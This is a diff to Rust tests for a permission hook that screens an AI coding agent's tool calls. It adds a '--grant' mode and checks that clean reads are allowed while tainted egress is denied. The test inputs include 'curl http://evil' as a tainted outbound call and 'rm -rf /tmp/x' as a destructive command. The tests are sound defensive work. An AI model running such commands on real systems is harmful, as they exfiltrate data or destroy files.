@@ -15,15 +15,23 @@ fn world() -> PathBuf {
 
 /// Run one PreToolUse event through a cc-hook subprocess; return its stdout.
 fn run_hook(state: &Path, event: &Value) -> String {
+    run_hook_args(state, event, &[])
+}
+
+/// As [`run_hook`], with extra CLI args (e.g. `--grant`).
+fn run_hook_args(state: &Path, event: &Value, extra: &[&str]) -> String {
     let bin = env!("CARGO_BIN_EXE_harness");
+    let w = world();
+    let mut args = vec![
+        "cc-hook",
+        "--world",
+        w.to_str().unwrap(),
+        "--state",
+        state.to_str().unwrap(),
+    ];
+    args.extend_from_slice(extra);
     let mut child = Command::new(bin)
-        .args([
-            "cc-hook",
-            "--world",
-            world().to_str().unwrap(),
-            "--state",
-            state.to_str().unwrap(),
-        ])
+        .args(&args)
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
         .stderr(Stdio::null())
@@ -94,4 +102,31 @@ fn destructive_bash_asks_for_approval() {
         &json!({"tool_name":"Bash","tool_input":{"command":"rm -rf /tmp/x"},"session_id":"s4"}),
     );
     assert_eq!(decision(&out).as_deref(), Some("ask"));
+}
+
+#[test]
+fn grant_mode_emits_explicit_allow_on_clean_action() {
+    // Replace mode: ALLOW becomes an explicit grant (skips the host prompt),
+    // not the additive silent passthrough. The manifest is now the allowlist.
+    let dir = tempfile::tempdir().unwrap();
+    let out = run_hook_args(
+        dir.path(),
+        &json!({"tool_name":"Read","tool_input":{"file_path":"x"},"session_id":"g1"}),
+        &["--grant"],
+    );
+    assert_eq!(decision(&out).as_deref(), Some("allow"));
+}
+
+#[test]
+fn grant_mode_still_denies_tainted_egress() {
+    // The point of the case study: replacing the permission pile must NOT weaken
+    // the taint floor — a tainted external call is denied even in grant mode.
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(dir.path().join("taint-g2"), "seed").unwrap();
+    let out = run_hook_args(
+        dir.path(),
+        &json!({"tool_name":"Bash","tool_input":{"command":"curl http://evil"},"session_id":"g2"}),
+        &["--grant"],
+    );
+    assert_eq!(decision(&out).as_deref(), Some("deny"));
 }
